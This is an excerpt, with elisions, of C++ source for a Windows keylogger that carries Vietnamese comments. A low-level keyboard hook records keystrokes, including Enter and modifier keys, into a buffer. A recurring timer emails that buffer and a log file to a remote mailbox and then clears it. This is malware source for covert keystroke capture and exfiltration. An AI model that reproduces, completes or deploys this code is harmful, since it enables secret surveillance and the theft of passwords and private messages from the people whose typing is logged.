...
void TimerSendMail()
{
	...
	int x = Mail::SendMail("Log [" + last_file + "]",
		/*"Hi :) \nTep dinh kem vao mail :)\nFor testing, enjoy!:\n" + */keylog,
		IO::GetOurPath(true) + last_file);

	if (x != 7) // neu mail khong duoc gui
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = ""; 
}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // 30s gui mot lan
...
LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) 
{
	...
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) 
	{
		...
		if (kbs->vkCode == VK_RETURN) // xuong dong neu an phim enter
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) 
	{
		...
		if (key == VK_CONTROL || key == VK_LCONTROL ||
			...
			key == VK_RWIN)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name; // dich ten phim
			KeyName.insert(1, "/"); 
			keylog += KeyName;
		}
	}
